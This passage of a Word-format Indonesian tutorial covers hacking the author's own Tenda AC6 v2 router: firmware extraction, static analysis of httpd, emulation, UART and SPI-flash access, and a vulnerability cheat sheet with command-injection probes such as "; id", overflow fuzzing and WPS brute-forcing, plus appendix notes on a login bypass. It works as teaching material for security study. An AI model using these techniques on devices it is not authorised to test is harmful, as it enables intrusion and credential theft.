      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Firmware adalah 'arsip' berlapis. Kita bongkar dengan binwalk.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># lihat isi</w:t>
        <w:br/>
        <w:t>tool: binwalk firmware.bin</w:t>
        <w:br/>
        <w:br/>
        <w:t># ekstrak otomatis</w:t>
        <w:br/>
        <w:t>binwalk -e firmware.bin</w:t>
        <w:br/>
        <w:br/>
        <w:t># jika squashfs 'non-standard', pakai sasquatch</w:t>
        <w:br/>
        <w:t># ubifs -&gt; ubireader_extract_images / ubireader_extract_files</w:t>
        <w:br/>
        <w:t># jffs2 -&gt; jefferson</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Pola umum lapisan:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> header vendor → kernel (uImage/zImage) → SquashFS rootfs (kadang + JFFS2/UBIFS untuk partisi writable).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Jika `unsquashfs` gagal versi, coba `sasquatch` (fork yang toleran).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Untuk UBIFS: `ubireader_extract_images` lalu `ubireader_extract_files`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>16. Analisis Filesystem</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Setelah rootfs terbuka (`squashfs-root/`), cari hal-hal ini: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Yang dicari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Lokasi contoh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Pelajaran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/web, /www, /htdocs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HTML/JS yang kita lihat di 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Daemon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/sbin, /usr/sbin, /bin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httpd, upnpd, telnetd — target analisis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 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/etc/init.d/, rcS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apa yang jalan otomatis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Kredensial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/etc/passwd, /etc/shadow,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default/hardcoded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Kunci/sertifikat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/etc/ssl, *.pem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sering sama di semua unit (bad)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 shell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*.sh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logika yang mudah dibaca, sering berisi bug</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># contoh pencarian cepat grep di rootfs:</w:t>
        <w:br/>
        <w:t>grep -rniE 'password|passwd|admin|system\(|popen\(' squashfs-root/ | head</w:t>
        <w:br/>
        <w:t>find squashfs-root -name '*httpd*' -o -name '*.sh'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daemon `httpd` adalah tempat hampir semua CVE web berada. Nama fungsi di CVE (formSet*, setaccount, exeCommand) mengarah ke binary ini.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>17. Analisis Statis Binary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Kita bedah `httpd` tanpa menjalankannya (static analysis).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>17.1 Teknik ringan (tanpa GUI)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>file squashfs-root/bin/httpd        # arsitektur, statis/dinamis</w:t>
        <w:br/>
        <w:t>readelf -h httpd | grep Machine</w:t>
        <w:br/>
        <w:t>strings -n 6 httpd | grep -iE 'goform|password|system|/bin/sh'</w:t>
        <w:br/>
        <w:t># cari simbol/panggilan fungsi berisiko</w:t>
        <w:br/>
        <w:t>objdump -d httpd | grep -E 'strcpy|sprintf|system|popen' | sort | uniq -c</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>17.2 Ghidra (analisis berat)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Buka binary di Ghidra, tunggu auto-analysis.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Gunakan Symbol Tree / Function List; cari nama fungsi dari CVE (mis. formSetPPTPServer).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Lihat XREF: dari string 'goform/...' → fungsi handler → fungsi parsing.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Tandai pola berbahaya: strcpy, sprintf, sscanf, system, popen, memcpy tanpa bound.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>17.3 Menghubungkan ke celah</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Contoh alur penemuan: find string `formSetPPTPServer` → handler memanggil `sscanf`/`strcpy` ke buffer kecil → parameter tak dibatasi → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>stack overflow</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>. Ini persis cara peneliti menemukan CVE-2024-51116.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>18. Emulasi Firmware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Emulasi menjalankan firmware di komputer (QEMU) sehingga bisa diuji </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tanpa perangkat fisik</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> dan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tanpa risiko merusak</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>. Alat bantu: FirmAE, FAT (Firmware Analysis Toolkit), atau QEMU + network chroot manual.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>FirmAE: otomatis menebak tipe perangkat &amp; mencoba boot.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>FAT: pipeline dengan Firmadyne untuk kernel/rootfs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Setelah jalan, akses httpd yang diemulasi, tembak payload, dan debug dengan gdb.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># gambaran alur (saat alat/VM siap):</w:t>
        <w:br/>
        <w:t>./run.sh -d tenda /path/firmware.bin</w:t>
        <w:br/>
        <w:t># lalu akses http://&lt;ip-emulasi&gt;/ dan uji ulang bypass/injeksi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Keuntungan besar untuk belajar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Anda bisa bereksperimen agresif (crash/overflow) tanpa khawatir merusak router asli.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>HARDWARE HACKING</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Saat Raspberry Pi, CH341A, dan USB-TTL tiba, inilah yang Anda lakukan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>19. UART: Mendapatkan Console/Shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>19.1 Konsep</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Banyak router meninggalkan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>serial console</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (UART) yang, saat terhubung, menampilkan bootlog dan kadang </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>prompt root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> langsung.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>19.2 Langkah praktis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Buka casing, cari 3-4 pin berdekatan (biasanya berlabel TX, RX, GND, VCC).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Pakai multimeter: GND = 0V; cari TX yang berdenyut saat boot.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Sambungkan USB-TTL: GND ke GND, RX↔TX silang, JANGAN sambung VCC dulu.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Buka serial: `screen /dev/ttyUSB0 115200` (coba baud lain: 57600, 9600).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Nyalakan perangkat → baca bootlog → tekan Enter saat diminta login.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># contoh monitor serial</w:t>
        <w:br/>
        <w:t>screen /dev/ttyUSB0 115200</w:t>
        <w:br/>
        <w:t># atau picocom -b 115200 /dev/ttyUSB0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>19.3 Yang dicari di bootlog</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Versi U-Boot &amp; cara masuk menu (spasi / tombol tertentu).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Prompt login root (kadang tanpa password, atau password default).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Nama partisi &amp; alamat memori (berguna untuk dump).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Pelajaran:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> pin UART yang tidak diproteksi = seringkali shell penuh. Ini vektor fisik paling umum pada perangkat konsumen.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>20. SPI Flash &amp; CH341A</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>20.1 Konsep</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Firmware tersimpan di chip flash (sering </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SPI NOR</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, 8-pin SOIC). Dengan CH341A + clip/solder, kita bisa </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>membaca (dump)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> seluruh isi chip — termasuk partisi &amp; konfigurasi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>20.2 Langkah praktis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Identifikasi chip (tulisan di body, mis. Winbond W25Q128).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Sambungkan clip ke CH341A (perhatikan orientasi pin 1).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Di Linux: cek `lsusb`; gunakan `flashrom`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>flashrom -p ch341a_spi -r dump.bin                      # baca</w:t>
        <w:br/>
        <w:t>flashrom -p ch341a_spi -w modif.bin                     # tulis (hati-hati!)</w:t>
        <w:br/>
        <w:t>flashrom -p ch341a_spi --layout rom.layout -i bios -r bios.bin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Analisis dump: `binwalk dump.bin` → lihat partisi, rootfs, config.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>20.3 Edit firmware (contoh belajar)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Kadang kita bisa menyisipkan shell/telnet ke rootfs, lalu reflash. Tapi hati-hati: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>salah tulis = brick</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>. Selalu backup (`-r`) dulu dan verifikasi checksum.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Cari partisi JFFS2/NVRAM berisi password — kadang langsung terbaca.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Beberapa chip punya proteksi; butuh tunggu/lepaskan dari board.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>21. Secure Boot &amp; Glitch (konsep)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Perangkat modern mulai memakai </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>secure boot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (firmware ditandatangani) dan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>read-out protection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>. Menembusnya butuh: fault injection (glitch tegangan/clock), chip-off, atau eksploitasi bootloader. Untuk pemula, cukup pahami konsepnya; fokus dulu ke perangkat tanpa proteksi (seperti banyak router konsumen).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Glitch: mengganggu eksekusi tepat saat verifikasi agar 'lolos'.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Chip-off: melepas chip dan baca dengan programmer.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Menu recovery/U-Boot sebagai pintu alternatif.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>POLA &amp; PENUTUP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>22. Cheat Sheet Pola Celah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Pola / Petunjuk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Kemungkinan celah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Langkah uji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Akun user/support/guest di endpoint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Backdoor/default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Coba kredensial tak terduga, bandingkan respons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JS/config bisa diakses tanpa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Information disclosure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curl file, grep endpoint &amp; versi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Endpoint 'Set*' tanpa CSRF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Cek apakah bisa dipanggil cross-site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password di API (wrlPwd/pwd)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cleartext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Panggil Get* dan lihat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Fitur ping/traceroute/diagnostik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 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 jinak '; id' / '; sleep 5'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Parameter ssid/list/page/time panjang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overflow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Kirim string panjang, amati crash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UPnP aktif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 forward dari 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Cek kontrol UPnP, buka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WPS aktif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 brute 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Baca PIN / brute, atau pixie-dust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 firmware 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 publik (RCE/DoS)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Cocokkan versi ke NVD, cari PoC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non-standar terbuka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Permukaan tak teruji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Banner grab, fuzz protokol</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>23. Roadmap &amp; Latihan Lanjutan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>23.1 Latihan di perangkat ini (aman)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ulangi Bab 4–7 dan catat setiap temuan pada template laporan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Uji lebih banyak kredensial default (user/support/guest) — dokumentasikan hasilnya.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Unduh firmware resmi AC6 v2, ekstrak dengan binwalk, cari /bin/httpd.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Jalankan `strings` pada httpd, cari 'goform' dan 'password'.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>23.2 Saat alat tiba</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Raspberry Pi: jadikan 'jump box' (nmap, FirmAE, ghidra-server).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>USB-TTL: coba UART pada perangkat latihan bekas (router lama) dulu.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CH341A: latih dump pada chip flash bekas sebelum menyentuh perangkat penting.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>23.3 Sumber belajar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>OWASP IoT Top 10 &amp; OWASP Testing Guide.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>NVD/CVE untuk memetakan versi → kerentanan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Repo riset (mis. FirmRec/IoT-Vulns) untuk melihat pola PoC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>FirmAE/FAT + Ghidra untuk analisis &amp; emulasi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>23.4 Etika &amp; karir</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Jadikan skill ini untuk </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>bug bounty, riset, audit, dan perbaikan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>. Selalu ada izin tertulis. Skill hardware/firmware sangat dicari di bidang keamanan embedded &amp; IoT.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>24. Glosarium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Istilah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Arti singkat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Software yang tertanam di perangkat (OS + aplikasi).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Rootfs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Filesystem utama firmware.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Serial console untuk komunikasi/debug.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SPI flash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Chip memori penyimpan firmware.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JTAG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Antarmuka debug hardware.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Alat membedah/mengekstrak firmware.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SquashFS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Filesystem terkompresi read-only khas embedded.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Ghidra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Reverse-engineering tool (free, NSA).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Command injection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Menyisipkan perintah shell lewat input.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Buffer overflow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Menimpa memori dengan input berlebih.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Memaksa browser admin mengirim perintah diam-diam.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kerentanan publik; CVSS = skor tingkat bahaya.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Emulasi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Menjalankan firmware di komputer (QEMU).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lampiran A — Bukti Live Perangkat Anda</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Seluruh gambar berikut berasal dari perangkat Tenda AC6 v2 Anda (192.168.0.1), diambil selama sesi belajar ini.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3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1_login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A.1 Halaman login asli perangkat.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557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2_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A.2 Dashboard admin asli (via sesi hasil bypass).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847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10_re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A.3 Hasil port scan &amp; service enumeration.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185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11_authby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A.4 Bukti login bypass user:user.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337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12_wifi_le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3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A.5 Bocor password WiFi (cleartext).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829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13_wps_lea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A.6 WPS aktif &amp; PIN bocor.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31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14_sysinf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3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A.7 Firmware &amp; status fitur.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829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15_cl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A.8 Daftar klien/DHCP.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52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20_attack_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A.9 Diagram lapisan serangan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Dibuat untuk pembelajaran pribadi pada perangkat milik sendiri. Gunakan ilmu ini secara bertanggung jawab dan legal.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II</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0B3D91"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>Reverse Engineering &amp; Binary Exploitation (MIPS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/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Router Tenda AC6 v2 (milik sendiri), firmware V15.03.06.51/52_multi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Arsitektur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MIPS 24Kc 32-bit LITTLE-ENDIAN (uImage Linux/MIPS, SquashFS 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Kernel (vmlinux), rootfs SquashFS (xz kustom), /bin/httpd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Fokus Vol.2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Pure RE (Ghidra/r2/gdb/capstone) + binary exploitation (stack, ROP, shellcode)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Prasyarat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Volume 1 (recon/web/firmware) berguna tapi tidak wajib</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
        </w:rPr>
        <w:t>ETIKA: hanya untuk perangkat milik sendiri / lab berizin. Eksploitasi bisa merusak; uji di emulasi dulu (QEMU/FirmAE), bukan langsung ke router produksi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Bagian ini masuk ke reverse engineering dan binary exploitation pada MIPS: membaca ELF, memakai Ghidra, mengenali pola celah di decompiler, hingga menulis dan men-debug eksploit di emulator.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>FONDASI REVERSE ENGINEERING</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Apa itu Reverse Engineering &amp; Mengapa Penting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Reverse Engineering (RE) = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>membalik proses</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>: dari binary jadi 'otak' di belakangnya. Di firmware hacking, sumber kode jarang tersedia, jadi kita wajib membaca hasil kompilasi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Menemukan celah yang tidak terlihat dari luar (buffer overflow, injeksi, backdoor).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
